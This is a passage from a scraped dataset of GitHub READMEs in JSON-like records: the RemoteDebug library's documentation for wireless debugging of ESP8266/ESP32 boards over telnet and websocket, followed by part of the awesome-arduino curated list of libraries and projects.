Beta\nKnown issues\n- Sometimes (rarely) the connection over telnet becomes very slow.\nEspecially right after uploading firmware.\nReset command in telnet connection or turn off/on can be resolve it.\nBut I need find why it occurs\nThanks\nFirst thanks a lot for Igrr for bring to us the Arduino ESP8266 and to Espressif to Arduino ESP32\nThanks to Links2004 for a good web server socket, used for web app connection.\nFor the logo: thanks to a freepik and pngtree sites for free icons that have in logo\nResources:\n- Example of TelnetServer code in http://www.rudiswiki.de/wiki9/WiFiTelnetServer\n- arduinoWebSockets library in https://github.com/Links2004/arduinoWebSockets\nEnd of README\nHit counter on this file, starting at 2019-03-03:", "link": "https://github.com/JoaoLopesF/RemoteDebug", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "remotedebug library\na library for arduino to debug projects over wifi, with web app or telnet client, with print commands like serial monitor.\na library to remotely debug over a wifi connection by telnet or web browser\nremotedebug setup a tcp/ip server, that you connect to debugging, as an alternative to the serial connection\ncontents\nabout\nhow it looks\ngithub\nnews\nbenefits\nhtml5 web app\ntelnet client\nwishlist\ninstall\nusing\nknown issues\nreleases\nthanks\nabout\nby default the arduino only has as debug possibility via the serial port. this has a few disadvantages:\nrequires a physical cable to the arduino device (if the device is far away or in a remote location this is not easy)\ndebugging multiple arduinos at the same time requires many serial ports and a lot of cables\nwith the esp8266 (nodemcu) or esp32 we now have network connectivity (wifi) which can be used for streaming debugging information in real-time.\nthis library is good for iot projects, home automation, mobile robots (can debug it in moviment with a cable ?) or another wifi projects.\nin fact, this library was born of a need to debug an iot project of home automation. in this project there was a central module and three auxiliary modules, and these were far from each other. one was hard to reach, under the roof of the house. to debug this project, accompanying the exchange of messages in realtime, is impossible to do with traditional way, by usb cable.\nthe mip_esp8266_library and my esp32 wifi robot are example of projects that uses remotedebug. see it in: mip_esp8266_library and esplorer_v1\nremotedebug is improved with client buffering (is last send is <= 10ms), to avoid mysterious delays of wifi networking on esp32 and esp8266 boards\nnote: if your project not use wifi, you can use my another library, the serialdebug library, this library works with any arduino board.\nnote ii: remotedebug library is now only to espressif boards, as esp32 and esp8266, if need for another wifi boards, please add an issue about this and we will see if it is possible made the port for your board.\nhow it looks\nimage: in remotedebugapp (web app)\nimage: in telnet client\nyoutube (remotedebug v2):\nyoutube (3 telnet connections with remotedebug) v1:\ngithub\ncontribute to this library development by creating an account on github.\nplease give a star, if you find this library useful, this help an another people, discover it too.\nplease add an issue for problems or suggestion.\nnews\nremotedebugapp beta\nnow have another repository, remotedebugapp it is for local copy of web app in internet. it is updated with lastest version of web app, after it is publised in web server: http://joaolopesf.net/remotedebugapp. download it, for use when internet is offline. as it is a local copy, the app will check for new versions periodically.\nan html5 web app to use for debugging in web browser, instead telnet client, that uses web socket to comunicate.\nnow remotedebug v3 have a web socket server too, to support the remotedebugapp connection.\nremotedebugapp is in beta, if you have any problems or suggestions, please add issue about this.\nthe telnet connection remains, to any want this, or to internet offline uses.\nversion 2.1.1\nnow remotedebug have a code converter, for help you to convert your codes: to do it, please access the remotedebugconverter\nversion 2.0.0\nnow remotedebug can have the same simple software debugger, that serialdebug library have. this is done, installing another library, the remotedebugger the remotedebugger act as an add on to remotedebug. to support this addon, the changes in remotedebug, is minimum, just a few callbacks it is done to no add extra overhead to projects that no need an debugger. to more informations please access the remotedebugger github repository.\nnow remotedebug have a new color system, using more colors, as done in serialdebugapp\nnote: due the remotedebug library, is migrate to arduino 1.5 format, with folder \"src\", please delete and reinstall the library to avoid duplication of remotedebug sources files.\nversion 1.5.*\nin 1.5.0 version, we have debug* and rdebug* macros (see below), that put automatically, the name of function that called, and core id (core id is only for esp32)\nbenefits\nserialdebug is better than arduino default debugging by serial.print commands:\nthis is more optimized\nbeing or not debugging via usb cable, the serial.print command allways is processed, waste cpu time on microcontroller. in other words, the debug commands are processed, with someone connected in the serial or not.\nwith remotedebug, all debug output is processed only if exists anyone debugging via telnet or web app connection.\nand with the debug levels of resource, the volume displayed of messages are reduced for higher levels. for example, only process all messages, if the level is the lowest, the verbose,\nremotedebug is otimized to reduce overheads, in cpu and memory and include client buffering feature.\nhave debug levels\nduring the development, we can put a lot of debug messages...\nbut with remotedebug, we can put a level in each one.\nfor all messages (except levels always (debuga) or error (debuge), the message only is processed and showed, if debug level is equal or higher than it level\nremotedebug have 6 debug levels, in order of priority:\nalway showed:\nerror: critical errors\nalways: important messages\nanother levels (showed if level is equal or higher that actual one):\nwarning: error conditions but not critical\ninfo: information messages\ndebug: extra information\nverbose: more information than the usual\nso we can change the level to verbose, to see all messages. or to debug to see only debug or higher level, etc.\nis very good to reduce a quantity of messages that a project can generate, to help debugging.\nit is easy to migrate\nremotedebug have a converter to help migrate your arduino codes, from serial.prints to this library.\nremotedebugconverter\neven if you want to do this manually, it's very simple. please see topic using above.\nhave auto function name and simple profiler\na simple debug:\ndebugv(\"* run time: %02u:%02u:%02u (verbose)\", mrunhours, mrunminutes, mrunseconds);\ncan generate this output in serial monitor:\n(v p:3065 loop c1) * run time: 00:41:23 (verbose)\nwhere: v: is the level\np: is a profiler time, elased, between this and previous debug\nloop: is a function name, that executed this debug\nc1: is a core that executed this debug (and a function of this) (only for esp32)\nthe remaining is the message formatted (printf)\nfor esp32, the core id in each debug is very good to optimizer multicore programming.\nhave commands to execute from telnet or web app\nfor example:\nshow help (?)\nchange the level of debug (v,d,i,w,e), to show less or more messages.\nsee memory (m)\nreset the board (reset)\nsee about remotedebug commands below.\nyou can add your own commands, see the examples please\nif your project have remotedebugger installed, have a new commands, e.g. call a function, see/change variables, ...\nhave a simple software debugger\nnow remotedebug (version >= 2.0.0), have an simple software debuggger, based in codes of serialdebug library.\nthis is another library, that act as an addon to remotedebug.\nplease acess the remotedebugger repository to more informations: remotedebugger\nready for production (release compiler)\nfor release your device, just uncomment debug_disabled in your project\ndone this, and no more debug processing.\nand better for debug_disabled, __remotedebug__ have zero overhead,\ndue is nothing of this is compiled.\nweb app\nas serialdebug, now remotedebug (v3) have an app,the remotedebugapp, to debug in web browser.\nthis app is an htm5 web app, with websocket to comunicate to arduino board.\nfor it, remotedebug v3 have a web socket server (can be disabled). it used a local copy of arduinowebsockets library, due it not in arduino library manager.\nas a large web page on web server, the solution for arduino is save it in a storage, like spiffs. but not have automatically updates new version in data saved this way, this spiffs data is good for a project but not for a library.\ndue it, this app not is stored and served by board, instead the app is in web: http://joaolopesf.net/remotedebugapp note: this not uses ssl (https), due web server socket on arduino, not supports ssl (wss). but after page load, all traffic is in local network, no data is exposed on internet.\nthe remotedebugapp is a modern html5 and needs a modern browsers to work. internet explorer 11 and safari 10 are an examples that not supported. but you can use anothers, as chrome, edge, firefox.\nthe web app is in beta, please add an issue, for problems or suggestions.\nnow have another repository, remotedebugapp it is for local copy of web app in internet. it is updated with lastest version of web app, after it is publised in web server: http://joaolopesf.net/remotedebugapp. download it, for use when internet is offline. as it is a local copy, the app will check for new versions periodically, for you can download a new version.\nthe telnet remains work, for when want this, or for fails on web app.\ntelnet\ntelnet is a standard way of remotely connecting to a server and is supported on all operating systems (windows, mac, linux...).\nmacosx and linux have a native telnet client.\nfor windows, a typical telnet client is the putty: putty .\nhave a good -----> tool !!!  for mobiles: the fing, please find it in your mobile store. its show all devices in local network (wifi), show ports opened and can execute the telnet client too (external app)\nremotedebug sets-up a telnet server which is listening to any telnet client that wants to connect. after connection, logging is streamed to the telnet client.\nremotedebug is very simple to use, after a few lines of initialization code, you can use the well-known \"print\" commands to stream your logging to the remote client.\ndebug levels\nremotedebug supports the filtering of logging based on debug levels:\nonly show for it actual debug level:\nverbose\ndebug\ninfo\nwarnings\nnote: these levels are in the order of most-logging -> least-logging.\nor for always show (not depends of actual debug level):\nany\nerrors\nnote: all debugs is processed and showed only if have a client connection.\nthe telnet client or web app can set the debug level by typing a few simple commands.\nprofiler\nremotedebug includes a simple profiler. it can be enabled by the connected client (telnet or web app) or the arduino code itself.\nwhen enabled, it shows the time between 2 debug statements, using different colors depending on the elapsed time.\na typical example would be to insert logging just before and after a function after which you can see how much the is spent in the function.\nlightweight\nremotedebug is designed to give minimal overhead (connected or not) and only process debugs,if there is a client (telnet or web app) connected.\ncustom commands\nremotedebug supports custom commands that can be entered in the client (telnet or web app). these trigger the execution of a custom function in the arduino code. for example this can be used to send back a status on request of the client.\ndisclaimer\nthe current version of remotedebug does not yet include any encrypted authentication, only plain text and is intended only for development, not use in production/release.\nfuture versions, if is possible, will include a secure way for authentication and further testing to support production environments.\nwishlist\n- an app to remotedebug like serialdebug have.\n- http page to begin/stop the telnet server or websocket server.\n- authentication as telnet support (kerberos, etc.) to support production environment\ninstall\njust download or clone this repository.\nor for arduino ide, you can use the library manager to install and update the library.\nfor install help, please click on this:\nfor another ide, or not using the library manager of arduino ide, i suggest you use a github desktop app to clone,it help to keep updated.\nplease open the projects in example folder, to see it working.\nusage\nincludes\n#include \"remotedebug.h\" //https://github.com/joaolopesf/remotedebug\ninstance\nremotedebug debug;\nsetup\nin the setup function after wifi initialization\n// initialize the server (telnet or web socket) of remotedebug\ndebug.begin(host_name);\n// or\ndebug.begin(host_name, startingdebuglevel);\n// options\ndebug.setresetcmdenabled(true); // enable the reset command\n// debug.showprofiler(true); // to show profiler - time between messages of debug\nnote: to enable the debugger, by remotedebugger, please acess this github repository: remotedebugger\nin the tail of loop function\n// remote debug over wifi\ndebug.handle();\n// or\ndebughandle(); // equal to serialdebug\nin any place of you code:\n#ifndef debug_disabled\nif (debug.isactive(debug.<level>)) {\ndebug.printf(\"bla bla bla: %d %s\", number, str); // or\ndebug.printf(\"bla bla bla: %d %s\", number, str.c_str()); // note: if type is string need c_str() // or\ndebug.println(\"bla bla bla 2 ln\");\ndebug.printf(\"float: %f\\n\", value); // not works in esp8266 :-(\n// note: to show floats with printf (esp8266 only),\n// you can use my arduinoutil library -> https://github.com/joaolopesf/arduinoutil\ndebug.printf(\"float: %s\\n\", util.formatfloat(value, 0, 5).c_str());\n}\n#endif\nnote: using isactive, you need surround the code by debug_disable precompile condition, to avoid compile it for production/release\nor short way (equal to serialdebug) (prefered if only one debug at time):\ndebuga(\"this is a any (always showed) - var %d\", var);\ndebugv(\"this is a verbose - var %d\", var);\ndebugd(\"this is a debug - var %d\", var);\ndebugi(\"this is a information - var %d\", var);\ndebugw(\"this is a warning - var %d\", var);\ndebuge(\"this is a error - var %d\", var);\ndebugv(\"this is a println\");\nor if your project uses several serial.print commands to generate a single debug message for example:\nserial.print(\"a = \");\nserial.print(a);\nserial.print(\" b = \");\nserial.print(b);\nserial.print(\" c = \");\nserial.println(c);\ncan be use rdebug* macros:\nrdebugv(\"a = \");\nrdebugv(a);\nrdebugv(\" b = \");\nrdebugv(b);\nrdebugv(\" c = \");\nrdebugvln(c);\nnote: in future, i suggest that you migrate this to a single debug command:\ndebugv(a = %d b = %d c = %d\", a, b, c);\nan example of use debug levels: (supposing the data is a lot of characters)\nif (debug.isactive(debug.verbose)) { // debug message long\ndebug.printf(\"routine: data received: %s\\n\", data.c_str()); // note: if type is string need c_str()\n} else if (debug.isactive(debug.debug)) { // debug message short\ndebug.printf(\"routine: data received: %s ...\\n\", data.substring(0, 20).c_str()); // %.20s not working :-|\n}\nstarting at version 1.5.0, debug macros (debug* and rdebug*), automatically put the name of function that called the macro, and core id (core id only for esp32).\nso:\nvoid foo() {\nuint8_t var = 1;\ndebugv(\"this is a debug - var %u\", var);\n}\nit will show in client (telnet or web app):\n(v p:^0000ms) (foo)(c1) this is a debug - var 1\nwhere:\nv -> verbose\np -> profiler time\n(foo) -> this is a function name that calls the debug macro\n(c1) -> it is running it core 1 (only for esp32)\nan example of use debug with serial enabled\nuseful to see messages if setup or\nin cause the esp8266/esp32 is rebooting (client connection stop before received all messages)\nonly for this purposes i suggest it\n// setup after debug.begin\ndebug.setserialenabled(true); // all messages too send to serial too, and can be see in serial monitor\nfor reduce overheads remotedebug is disconnect the client (telnet or web app), if it not active.\n- please press enter or any key if you need keep the connection\n- the default is 5 minutes (you can change it in remotedebug.h)\n- you can use mdns to register each node with different name, it helps to connect without know the ip.\nplease not forget to use if clause with debug.isactive (if not using debug macros)\n---> this is very important to reduce overheads and work of debug levels\nplease see the samples, basic or advanced, to learn how to use\nin advanced sample, i used wifimanager library, arduinoota and mdns, please see it.\nreleases\n3.0.5 - 2019-03-23\n- ajustment on debuga macro, thanks @jetpax and @cmidgley to add this issue.\n3.0.4 - 2019-03-19\n- all public configurations (#defines) have moved to remotedebugcfg.h, to facilitate changes for anybody.\n- changed examples, with warnings on change any #define in project,\nwith workarounds if it not work. (thanks to @22marioz for added this issue)\n3.0.3 - 2019-03-18\n- adjustments if web socket is disabled\n3.0.2 - 2019-03-16\n- adjustments in examples, added one for debugger\n3.0.1 - 2019-03-13\n- adjustments in silente mode\n- commands from remotedebugapp now is treated\n- adjusts to remotedebugger support connection by web sockets\n3.0.0 - 2019-03-10\n- if not disabled, add a web socket server to comunicate with remotedebugapp (html5 web app)\n- the standard telnet still working, to debug with internet offline\n- ajustment on debuga macro, thanks @jetpax to add this issue\n2.1.2 - 2019-03-08\n- add empty rprint* macros, if debug is disabled\n2.1.1 - 2019-03-06\n- create option debug_disable_auto_func\n- create macros to be used for code converter: rprint and rprintln\nremotedebug now have an code converters to help migrate codes\n2.1.0 - 2019-03-04\n- create precompiler debug_disabled to compile for production/release,\nequal that have in serialdebug\n- adjustments in examples\n2.0.1 - 2019-03-01\n- adjustments for the debugger: it still disable until dbg command, equal to serialdebug\n- the callback will to be called before print debug messages now\n- and only if debugger is enabled in remotedebugger (command dbg)\n- changed handle debugger logic\n2.0.0 - 2019-02-28\n- added support to remotedebug addon library: the remotedebugger, an simple software debugger, based on serialdebug\n- new color system\n1.5.9 - 2019-02-18\n- bug -> sometimes the command is process twice\n- workaround -> check time\n1.5.8 - 2019-02-08\n- new macros to compatibility with serialdebug (can use remotedebug or serialdebug) thanks to @phrxmd\n1.5.7 - 2018-11-03\n- fixed bug for max_time_inactive, thanks to @achuchev to add this issue\n1.5.6 - 2018-10-19\n- adjustments based on pull request from @jeroenst (to allow serial output with telnet password and setpassword method)\n1.5.5 - 2018-10-19\n- serial output is now not allowed if telnet password is enabled\n- few adjustments\n1.5.4 - 2018-10-05\n- few adjustment in write logic\n1.5.3 - 2018-09-04\n- serial output adjustments (due bug in password logic)\n1.5.2\n- correct rdebug macro (thanks @stritti)\n1.5.1 - 2018-08-28\n- new silent mode (command s)\n1.5.0 - 2018-08=26\n- auto function name and esp32 core id for rdebug* macros\n- begin method have a option for port number\n- few adjustments\n- added new rdebug?ln to put auto new line\n1.4.0 - 2018-08-18\n- simple text password request feature (disabled by default)\nnotes:\nit is very simple feature, only text, no cryptography,\nand the password is echoed in screen (i not discovery yet how disable it)\ntelnet use advanced authentication (kerberos, etc.)\nsuch as now remotedebug is not for production (releases),\nthis kind of authentication will not be done now.\n1.3.1 - 2018-08-18\n- adjustments in precompiler macros\n1.3.0 - 2018-08-17\n- bug in write with latest esp8266 sdk\n- port number can be modified in project arduino (.ino file)\n- few adjustments as esp32 includes\n1.2.2\n- adjustments, as avoid esp32 include errors\n- telnet port of server can be modified by project\njust put it in your .ino, before the include:\n1.2.0\n- shortcuts and client buffering to avoid mysterious delay of esp networking\n1.1.0\n- adjustments and now runs in esp32 too.\n1.0.0\n- adjustments and improvements from beta versions.\nnew features:\n- filter\n- colors\n- support to windows telnet client\n0.9\n- first beta\nknown issues\n- sometimes (rarely) the connection over telnet becomes very slow.\nespecially right after uploading firmware.\nreset command in telnet connection or turn off/on can be resolve it.\nbut i need find why it occurs\nthanks\nfirst thanks a lot for igrr for bring to us the arduino esp8266 and to espressif to arduino esp32\nthanks to links2004 for a good web server socket, used for web app connection.\nfor the logo: thanks to a freepik and pngtree sites for free icons that have in logo\nresources:\n- example of telnetserver code in http://www.rudiswiki.de/wiki9/wifitelnetserver\n- arduinowebsockets library in https://github.com/links2004/arduinowebsockets\nend of readme\nhit counter on this file, starting at 2019-03-03:", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000093, "year": null}, {"Unnamed: 0": 2137, "autor": 97, "date": null, "content": "awesome-arduino\nA curated list of awesome Arduino hardware, libraries and projects\nAwesome Arduino\nLibraries\nHardwareBoard\nIDE\nTutorials\nProjects\nContributing\nLibraries\nHardware dependent library\nrtclib - A lightweight date and time library for JeeNodes and Arduinos\nRFM69 - RFM69 library for RFM69W and RFM69HW (Semtech SX1231, SX1231H)\nRFM12B - Arduino RFM12B library\nSPIFlash - Arduino library for read/write access to SPI flash memory chips\nWinbond_flash - SPI library for Winbond Flash Memory modules\nov7670-no-ram-arduino-uno - Arduino library for OV7670\nDHT-sensor-library - Arduino library for DHT11DHT22, etc Temp & Humidity Sensors\nArduino-DHT22 - Arduino library for the DHT22 humidity and temperature sensor\nrfid - Arduino RFID Library for MFRC522\n433Utils - A collection of code and documentation to assist your usage of RF 433MHz modules\nesp-link - ESP8266 wifi-serial bridge, outbound TCP, and Arduino/AVR/LPC/NXP programmer\nArduino-Temperature-Control-Library - Arduino Library for Maxim Temperature Integrated Circuits\nRF24 - Arduino driver for nRF24L01\nRF24 - Optimized fork of nRF24L01 for Arduino and Raspberry Pi\nRF24Mesh - Mesh Networking for RF24Network\ndue_can - Object oriented CANbus library for Arduino Due compatible boards\nFastLED - Easily & efficiently controlling a wide variety of LED chipsets for Arduino\niot-playground - ESP8266 EasyIoT library and sensor examples\nespduino - ESP8266 network client (MQTT, restful) for Arduino\nesp_mqtt - MQTT client library for ESP8266 Soc\nesp_bridge - ESP8266 firmware SLIP Command, support mqtt, RESTful client\nUltrasonic-HC-SR04 - Ultrasonic HC-SR04 library for Arduino\nMPU-9250 - Arduino sketch for MPU-9250 9DoF with AHRS sensor fusion\nMPU-6050 - Basic MPU-6050 Arduino sketch of sensor function\nMPU-9150 - Arduino sketch for MPU-9150 9DoF with AHRS sensor fusion\nLSM9DS0 - LSM9DS0 9DOF sensor AHRS sketch\narduino-ds1302 - Arduino library for the DS1302 Real Time Clock chip\nxbee-arduino - Arduino library for communicating with XBees in API mode\nEnableInterrupt - New Arduino interrupt library, designed for Arduino Uno/Mega 2560/Leonardo/Due\nDS3232RTC - Arduino Library for Maxim Integrated DS3232 and DS3231 Real-Time Clocks\nds3231 - Arduino library for DS3231 RTC\nRTClib - RTC library\narduino-ds1302 - Arduino library for the DS1302 Real Time Clock chip\nHX711 - An Arduino library Semiconductor HX711 ADC for Weight Scales.\nMiniPirate - Arduino Serial Command Tool\nLedControl - An Arduino library for MAX7219 and MAX7221 Led display drivers\narduino-BLEPeripheral - Arduino library for creating custom BLE peripherals with Nordic Semiconductor's nRF8001 or nR51822\nBTLE - Library for basic Bluetooth Low Energy with the nRF24L01+\nBH1750 - An Arduino library for the digital light sensor BH1750FVI\nArduino-GP2Y0A21YK-library - Arduino library for the Sharp GP2Y0A21YK IR Distance sensor\nArduino-distance-sensor-library - Arduino library for distance sensors\narduino-BLEPeripheral - Library for creating custom BLE peripherals with Nordic Semiconductor's nRF8001 or nR51822\nArduino-Temperature-Control-Library - Arduino Library for Maxim Temperature Integrated Circuits\nRGB-matrix-Panel - Arduino library and example code for the 16x32 RGB matrix panels\nTime - Time library for Arduino\nmodbusino - Small Modbus slave, RTU (serial) for Arduino\nsimplemodbusng - Modbus RTU Slave/Master for the Arduino\nBootloader\nHoodLoader2 - 16u2 Bootloader to reprogram 16u2 + 328/2560 with Arduino IDE\noptiboot - Small and Fast Bootloader for Arduino and other Atmel AVR chips\nHardware independent library\nArduino-IRremote - Infrared remote library for Arduino: send and receive infrared signals ....\nIRLib - An Arduino library for encoding and decoding infrared remote signals\ni2cdevlib - I2C device library collection for AVR/Arduino or other C++-based MCUs\nkeysweeper - KeySweeper is a stealthy Arduino-based device, camouflaged as a functioning USB ....\naJson - an Arduino library to enable JSON processing with Arduino\nArduinoJson - C++ JSON library for IoT. Simple and efficient.\njson-streaming-parser - Library for parsing potentially huge json streams on devices with scarce memory\nUSB_Host_Shield_2.0 - Revision 2.0 of USB Host Library for Arduino\npubsubclient - A client library for the Arduino Ethernet Shield that provides support for MQTT\nWiringPi - Gordon's Arduino wiring-like WiringPi Library for the Raspberry Pi\nArduino-PID-Library - A pid library for Arduino written in C++\nfirmata - Firmata firmware for Arduino\nuSpeech - Speech recognition toolkit for the Arduino\nTalkie - Speech library for Arduino\nLow-Power - Low Power Library for Arduino\nArduinoOBD - OBD-II library and sketches for Arduino\nhiduino - Native USB-MIDI on the Arduino\nBrain - Arduino library for reading Neurosky EEG brainwave data\nCryptosuite - Cryptographic suite for Arduino (SHA, HMAC-SHA)\nTimer - A fork of Simon Monk's Arduino Timer library\nPJON - One wire multi master device communications bus system for Arduino\nHID - Enhanced HID functions for Arduino\nCosa - An Object-Oriented Platform for Arduino Programming\nNDEF - Read and Write NDEF Messages to NFC tags with Arduino\nrosserial - ROS client library for small, embedded devices, such as Arduino\nSdFat - Arduino FAT16/FAT32 Library\nArduino-Communicator - Very simple Android application for communicating with Arduino\nArduino-PID-AutoTune-Library -\nTinyGPS - A compact Arduino NMEA (GPS) parsing library\nArduino-EEPROMEx - Extended EEPROM library for Arduino\nArduino-CmdMessenger - CmdMessenger Communication library for Arduino\narduino-libs-manchester - Arduino Manchester Encoding\nShiftPWM - Arduino Library for software PWM with shift registers\nArduino-EasyTransfer - An Easy way to Transfer data between Arduinos\nArduino-SerialCommand - A Wiring/Arduino library to tokenize and parse commands received over a serial port.\nTMRpcm - Arduino library for asynchronous playback of PCM/WAV files direct from SD card\nMozzi - A sound synthesis library for Arduino\nStandardCplusplus - Standard C++ for Arduino (port of uClibc++)\nArdOSC - Open Sound Control(OSC) Library for Arduino\nOSC - Arduino and Teensy implementation of OSC encoding\narduino-serial - Example C and Java host code to talking to an Arduino or other \"serial\" device\nBounce2 - Debouncing library for Arduino or Wiring\nArduinoThread - A simple way to run Threads on Arduino\nAdaEncoder - Library for handling quadrature encoders for the Arduino microcontroller\nPinChangeInt - Pin Change Interrupt library for the Arduino\nArduino-RFID - Arduino RFID reader with computer serial client\narcore - MIDI-USB Support for Arduino\narduino-base64 - A base64 library for the arduino platform, written in C\nDirectIO - Fast, simple I/O library for Arduino\narduino-EventManager - An event handling system for Arduino\nOneButton - An Arduino library for using a single button for multiple purpose input\nJTAG - JTAG library for Arduino\nSleep_n0m1 - A library that sets the Arduino into sleep mode for a specified length of time\nAESLib - Arduino Library for AES Encryption\nMemoryFree - Arduino MemoryFree library\nsouliss - Arduino based Distributed Networking Framework for Smart Homes and IoT\nLED-Matrix - Single/bi/tri-color LED Matrix PWM driver for arduino\nOneWire - Library for Dallas/Maxim 1-Wire Chips\nTinyEKF - Lightweight C/C++ Extended Kalman Filter with Arduino example\narduino_midi_library - MIDI for Arduino\nFreeRTOS-Arduino - FreeRTOS 8.2.3 Arduino Libraries\nArduino_FreeRTOS_Library - A FreeRTOS Library for all Arduino AVR Devices\nAutomaton - Reactive State Machine Framework for Arduino\nLinkedList - A fully implemented LinkedList made to work with Arduino projects\nVirtualUsbKeyboard - Virtual an Arduino as a HID device\nvirtual-shields-arduino - Windows Virtual Shields for Arduino library\n3D Printer .\nRepetier-Firmware - Firmware for Arduino based RepRap 3D printer\n3D_Printer - Underverk's 3D printer\ngrbl - An open source, embedded, high performance g-code-parser and CNC milling controller run on a straight Arduino\nNET Library.\nWebduino - Arduino WebServer library\nTinyWebServer - Small web server for Arduino, fits in 10KB ROM, less than 512 bytes RAM\nRESTduino - A sketch to provide a REST-like interface to the Arduino+Ethernet Shield\naREST - A RESTful environment for Arduino\nArduinoWebsocketClient - Websocket client for Arduino\nArduinoWebsocketServer - a Websocket server running on an Arduino\nesp8266 - ESP8266 Wifi library and sample code for Arduino\narduino_uip - A plugin-replacement of the stock Arduino Ethernet library\nHttpClient - Http Client Library for the Spark Core\narduino-restclient - Arduino RESTful HTTP Request Library\nsocket.io-arduino-client - A socket.io client for the Arduino Ethernet shield\nArduino-IPv6Stack - IPv6 stack for Arduino and Xbee based on Contiki OS network stack\nMQTT-SN-Arduino - Connecting mesh network to the MQTT broker and tunneling MQTT protocol over Websocket\nArduinoDuePolarSSLClient - Sample Arduino Due sketch connecting to a PolarSSL server using PSK authentication\narduino-mqtt - MQTT library for Arduino based on the Eclipse Paho projects\naWOT - Arduino web server library\narduinoWebSockets - WebSocket Server and Client for Arduino\nHttpClient - Arduino HTTP library\naws-iot-device-sdk-arduino-yun - SDK for connecting to AWS IoT from an Arduino Y\u00fan.\nHttpClient - Arduino HTTP library\nmicrocoap - A small CoAP implementation for microcontrollers\nCommand line library\nplatformio - Cross-platform code builder and the missing library manager ....\narduino-cmake - Arduino CMake Build system\nbitlash - A programmable command shell for Arduino\narduino-shell - A command shell to interact with built-in Arduino features\nDisplay library\nArduino_LCD_Menu - Creates menu systems primarily useful for 16x2 or 16x4 LCD displays\nLiquidMenu - Menu creation library for HD44780 LCDs (parallel and I2C), wraps LiquidCrystal.\nLiquidTWI2 - high speed I2C LCD Library for Arduino, which supports MCP23008 and MCP23017\nMENWIZ - LCD menu library: Short user code to manage complex menu structures\nu8glib - Arduino Monochrome Graphics Library for LCDs and OLEDs\nucglib - Arduino True Color Library for TFTs and OLEDs\nBinding and API library\njohnny-five - JavaScript Robotics and IoT programming framework, Based on Arduino Firmata Protocol\nPython-Arduino-Command-API - A Python library for communicating with Arduino microcontroller boards\nhidapi - A Simple library for communicating with USB and Bluetooth HID devices on Linux, Mac, and Windows.\nBlocklyDuino - a web-based visual programming editor for arduino\nnoduino - JavaScript and Node.js Framework for controlling Arduino with HTML and WebSockets\nino - Command line toolkit for working with Arduino hardware\nusb-serial-for-android - Android USB host serial driver library for CDC, FTDI, Arduino and other devices\nserial-port-json-server - A serial port JSON websocket server communicate with Arduino\nPhysicaloidLibrary - Android Library for communicating with physical-computing boards\nblynk-server - Platform with iOS and Android apps to control Arduino\nrad - Ruby Arduino Development\nardublock - A Block Programming Language for Arduino\narduino-api - Arduino library for real-time logging and streaming data to online plotly graphs\ndino - Dino is a ruby gem that helps you bootstrap prototyping with an Arduino\nduino - Arduino framework for node.js\npyFirmata - Python interface for the Firmata protocol\nJArduino - Program your Arduino in Java\nPython-Arduino-Command-API - A Python library for communicating with Arduino microcontroller boards\nhwio - Go library for hardware I/O control, in the programming style of Arduino\nRPC\nArduRPC - RPC library for Arduino and other microcontroller based boards\narduino-json-rpc - Simple JSON-RPC server implementation for Arduino\nMath library\nArduino-signal-filtering-library - Arduino library for signal filtering\nGaussian - Gaussian filter for Arduino\nHardwareBoard\nHardware board for arduino diy.\nTeensy - The Teensy is a complete USB-based microcontroller development system\nblackmagic - In application debugger for ARM Cortex microcontrollers\nstm32plus - C++ library for the STM32 F0, F100, F103, F107 and F4\nIDE\nArduino developments\narduino - Official Arduino IDE\nESP8266 IDE - Arduino IDE for ESP8266\nStino - A Sublime Text Plugin for Arduino\nattiny - ATtiny microcontroller support for the Arduino IDE\narduinounit - A unit testing framework for Arduino libraries\nArduino-Makefile - Makefile for Arduino sketches\narduino_sketches - Publicly-released sketches for the Arduino microprocessor\narduino-builder - A command line tool for compiling Arduino sketches\narduinounit - A unit testing framework for Arduino libraries\narduino-eclipse-plugin - A plugin to make programming the Arduino in Eclipse easy\ndueboot - Rust on the Arduino Due\nArduino-Designer - Graphic Arduino designer based on Eclipse\nXOD - Open source visual programming language and IDE\nTutorials\nTutorials for arduino flash.\nArduino-Tutorial-Series - These are the supporting materials for my popular series of Tutorials on the Arduino Microcontroller Platform\nesp8266 - Various bits of code for ESP8266\narduino_sketches - Publicly-released sketches for the Arduino microprocessor\nDUEZoo - Some proof-of-concept sketches and results for Arduino DUE\nprogramming_arduino - Code for the book Programming Arduino: Getting Started with Sketches\nArduinoExamples - Arduino Blink Chrome App\nProjects\nProjects with Arduino\narduinoscope - An oscilloscope, using Arduino and Processing/node\nArduinoPlot - Real time Plot Numeric Values sent from Arduino over Serial Port\nArduinoISP - Use the Arduino to program AVR chips\narduino-sms-alarm - An Arduino based burglar alarm that sends an SMS when motion is detected\nQUADCOPTER_V2 - A quadcopter project based on Raspberry Pi and Arduino\nArduino Time Lapse Panorama Controller - The controller will rotate your GoPro over a set angle for a set duration or will rotate your GoPro for a full rotation for a set duration\nErbbie Desktop Garden - A DIY desktop smart garden designed to give everyone a green thumb\nSmart Garden - clone of Erbbie\nTemperature controlled craft beer coolbox - A coolbox in which you can control the temperature in three separate compartments\nUsage\nwork in 'git bash' at Windows with Git installed or Linux OS\nsh update.sh\nusage()\n{\necho \"\"\necho \" usage:\"\necho \"\"\necho \"./update.sh <cmd>\"\necho \" where <cmd> is one of:\"\necho \" --install-or-update (does full installation or update.)\"\necho \" --remove  (removes all installed)\"\necho \"\"\necho \"example:\"\necho ' $ ./update.sh --install-or-update'\n}\nContributing\nContributing\nYour contributions are always welcome!", "link": "https://github.com/Lembed/Awesome-arduino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome-arduino\na curated list of awesome arduino hardware, libraries and projects\nawesome arduino\nlibraries\nhardwareboard\nide\ntutorials\nprojects\ncontributing\nlibraries\nhardware dependent library\nrtclib - a lightweight date and time library for jeenodes and arduinos\nrfm69 - rfm69 library for rfm69w and rfm69hw (semtech sx1231, sx1231h)\nrfm12b - arduino rfm12b library\nspiflash - arduino library for read/write access to spi flash memory chips\nwinbond_flash - spi library for winbond flash memory modules\nov7670-no-ram-arduino-uno - arduino library for ov7670\ndht-sensor-library - arduino library for dht11dht22, etc temp & humidity sensors\narduino-dht22 - arduino library for the dht22 humidity and temperature sensor\nrfid - arduino rfid library for mfrc522\n433utils - a collection of code and documentation to assist your usage of rf 433mhz 